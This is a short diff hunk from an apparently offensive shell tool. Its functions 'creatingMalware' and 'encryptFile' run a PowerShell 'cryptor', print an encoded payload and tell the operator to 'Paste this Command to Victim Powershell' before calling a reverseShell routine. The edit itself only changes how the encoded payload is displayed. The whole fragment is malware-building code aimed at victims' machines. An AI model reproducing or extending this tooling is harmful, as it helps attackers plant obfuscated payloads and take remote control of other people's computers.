@@ -24,7 +24,7 @@ creatingMalware() {
 encryptFile() {
     pwsh -file cryptor.ps1
     clear ; sleep 5
-    powershell -e cat encode.txt
+    cat encode.txt
     printf "\nJust Paste this Command to Victim Powershell\n"
     printf "\n"
     reverseShell
